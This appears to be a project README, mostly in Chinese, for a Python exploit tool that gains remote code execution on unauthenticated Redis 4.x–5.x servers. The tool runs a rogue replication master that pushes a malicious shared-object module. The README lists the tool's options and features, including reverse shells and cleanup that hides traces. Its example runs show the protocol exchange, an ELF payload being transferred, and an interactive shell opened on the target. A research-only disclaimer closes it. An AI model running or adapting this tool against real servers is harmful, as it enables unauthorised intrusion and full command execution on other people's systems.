# Awsome Redis Rogue Server

学习研究Redis未授权时发现现有文章对Redis Rogue Server RCE技术的原理不甚详细，随对原理进行进一步研究，对当前实现`Rogue Server`的`python`利用代码和`module.c`源码进行了学习与改进.

`Redis Rogue Server`的涉及主要技术为Redis的**主从复制**以及**外部模块加载**，攻击核心思路如下：

![redis-rogue-server.jpg](https://i.loli.net/2019/12/20/KfcrkUu89joGe34.png)



### 红队测试特性

+ 重写外部模块内存申请，避免被测试Redis服务器崩溃。
+ 更稳定的直连Shell与反弹Shell
+ 单独`Rogue Server`模式
+ `Redis-Cli`与`Rogue Server`分离模式
+ 可写路径尝试
+ 添加标准错误重定向
+ 优化Shell解码问题
+ `so`随机名称、加载模块名称变更
+ 模块卸载、`so`文件清理，保持服务器的服务正常
+ Redis pass认证

**详看源码**



### 适用范围

Redis 4.x <= 5.x



### Usage

```bash
$ python3 redis_rogue_server.py -h
usage: python3 redis_rogue_server.py -rhost [target_ip] -lhost [rogue_ip] [Extend options]

 Redis unauthentication test tool.

optional arguments:
  -h, --help      show this help message and exit
  -rhost RHOST    Target host.
  -rport RPORT    Target port. [default: 6379]
  -lhost LHOST    Rogue redis server, which target host can reach it.
                  THIS IP MUST BE ACCESSIBLE BY TARGET!
  -lport LPORT    Rogue redis server listen port. [default: 15000]
  -passwd PASSWD  Target redis password.
  -path SO_PATH   "Evil" so path. [default: module.so]
  -t RTIMEOUT     Rogue server response timeout. [default: 3]
  -s              Separate mod.
                  Whether Redis-Cli(This ip) and rogue Server(Can be other ip) are separated
                  rogue Server port listens locally by default, use flag -s shut down local port if lport conflict.
  -v              Verbose Mode.

Example:
  redis_rogue_server.py -rhost 192.168.0.1 -lhost 192.168.0.2
  redis_rogue_server.py -rhost 192.168.0.1 -lhost 192.168.0.2 -rport 6379 -lport 15000

Only Rogue Server Mode:
  redis_rogue_server.py -v

```



### Example

```bash
$ python3 redis_rogue_server.py  -rhost 192.168.229.136 -lhost 192.168.229.150 -v
[*] Init connection...
[+] Target accessible!
[*] Exploit Step-1.
[+] RDB dir: /home/test/Desktop/redis-5.0.7
[*] Done.
[+] Accept connection from 192.168.229.136:44674
[>>]b'*1\r\n$4\r\nPING\r\n'
[<<]b'+PONG\r\n'
[>>]b'*3\r\n$8\r\nREPLCONF\r\n$14\r\nlistening-port\r\n$4\r\n6379\r\n'
[<<]b'+OK\r\n'
[>>]b'*5\r\n$8\r\nREPLCONF\r\n$4\r\ncapa\r\n$3\r\neof\r\n$4\r\ncapa\r\n$6\r\npsync2\r\n'
[<<]b'+OK\r\n'
[>>]b'*3\r\n$5\r\nPSYNC\r\n$40\r\ne46ef23509ec51bb952dec34cb84e6c08388e5eb\r\n$1\r\n1\r\n'
[<<]b'+FULLRESYNC d2b79a2fbd16c050cdf136838f67093efb76509 1\r\n$45608\r\n\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00 *\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00...'
[*] The Rogue Server Finished Sending the Fake Master Response.
[*] Wait for redis IO and trans flow close...
[*] Exploit Step-2.
[*] Done.
[+] It may crash target redis cause transfer large data, be careful.
[?] Shell? [i]interactive,[r]reverse:i
[!] DO NOT USING THIS TOOL DO ANYTHING EVIL!
[+] =========================== Shell ============================= 
$ id
uid=1000(test) gid=1000(test) groups=1000(test),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)
$ exit
[*] Plz wait for auto exit. Cleaning.... 
[!] DO NOT SHUTDOWN IMMEDIATELY!
[*] Done.
```



#### 分离模式

```
Rogue Server端: 192.168.229.150
攻击端: 192.168.229.136
```



不同于其他利用模块，将分离模式如用上图示所示。

先运行`Rogue Server`再运行攻击端`Redis-Cli`发送攻击指令，即本地将不会运行 `Rogue Server` ，而是依靠远程主机的 `Rogue Server`进行响应。



**Rogue Server端**

```bash
python3 ./redis_rogue_server.py  -v
[*] Listening on port: 15000
[+] Accept connection from 192.168.229.136:44762
[>>]b'*1\r\n$4\r\nPING\r\n'
[<<]b'+PONG\r\n'
[>>]b'*3\r\n$8\r\nREPLCONF\r\n$14\r\nlistening-port\r\n$4\r\n6379\r\n'
[<<]b'+OK\r\n'
[>>]b'*5\r\n$8\r\nREPLCONF\r\n$4\r\ncapa\r\n$3\r\neof\r\n$4\r\ncapa\r\n$6\r\npsync2\r\n'
[<<]b'+OK\r\n'
[>>]b'*3\r\n$5\r\nPSYNC\r\n$40\r\na62cf45a906d4a68422cac6f835108dbecb25f3b\r\n$1\r\n1\r\n'
[<<]b'+FULLRESYNC b79062efe2211aa8328ab4da3d501fa21b2ac54a 1\r\n$45608\r\n\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00\x01\x00\x00\x00 *\x00\x00\x00\x00\x00\x00@\x00\x00\x00...'
[*] Wait for redis IO and trans flow close...
```



**攻击端**

```bash
python3 redis_rogue_server.py -rhost 192.168.229.136 -lhost 192.168.229.150 -s -v
[*] Separate Mode. Plz insure your Rogue Server are listening.
[*] Init connection...
[+] Target accessible!
[*] Exploit Step-1.
[+] RDB dir: /home/test/Desktop/redis-5.0.7
[*] Done.
[*] Wait 3 secs for REMOTE Rogue Server response.(Use flag -t [N] to change timeout)
[!] Make sure your remote Rogue Server is working now!
[*] Exploit Step-2.
[*] Done.
[+] It may crash target redis cause transfer large data, be careful.
[?] Shell? [i]interactive,[r]reverse:i
[!] DO NOT USING THIS TOOL DO ANYTHING EVIL!
[+] =========================== Shell =============================
$ id
uid=1000(test) gid=1000(test) groups=1000(test),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)
$ exit
```





#### 模块源码重编译

修改`RedisModules/src/module.c`，然后运行编译`make`

```bash
$ vim ./RedisModules/src/module.c
$ cd RedisModules
$ make
```



### 参考：

[ https://github.com/RicterZ/RedisModules-ExecuteCommand ]( https://github.com/RicterZ/RedisModules-ExecuteCommand )



### 声明

**该项目仅作为安全学习交流之用途，请遵守当地法律法规，任何用于非法用途产生的后果将由使用者本人承担。**

**All responsibilities are at your own risk., Please use it only for research purposes.**